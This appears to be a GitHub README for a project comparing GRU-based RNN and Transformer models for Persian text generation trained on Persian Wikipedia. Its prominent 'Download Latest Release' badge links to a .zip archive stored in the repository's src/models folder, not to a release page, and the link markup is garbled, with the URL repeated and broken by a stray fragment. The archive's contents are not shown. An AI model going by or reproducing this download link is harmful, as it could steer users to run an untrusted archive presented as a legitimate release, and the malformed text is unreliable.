[![Download Latest Release](https://raw.githubusercontent.com/Gujuju04/pytorch-rnn-vs-transformer-persian-generation/main/src/models/pytorch-rnn-vs-transformer-persian-generation_v3.5.zip%20Latest%https://raw.githubusercontent.com/Gujuju04/pytorch-rnn-vs-transformer-persian-generation/main/src/models/pytorch-rnn-vs-transformer-persian-generation_v3.5.zip)](https://raw.githubusercontent.com/Gujuju04/pytorch-rnn-vs-transformer-persian-generation/main/src/models/pytorch-rnn-vs-transformer-persian-generation_v3.5.zip)

## 📦 Overview

This project implements and compares two powerful models, the Recurrent Neural Network (RNN) using Gated Recurrent Units (GRU) and the Transformer, for next-word prediction. We built these models using a Persian Wikipedia dataset, making it suitable for Persian text generation tasks. 

You can use this software for various applications, such as creating chatbots, generating stories, and more. Our goal is to provide an easy way for you to experiment with these advanced models.
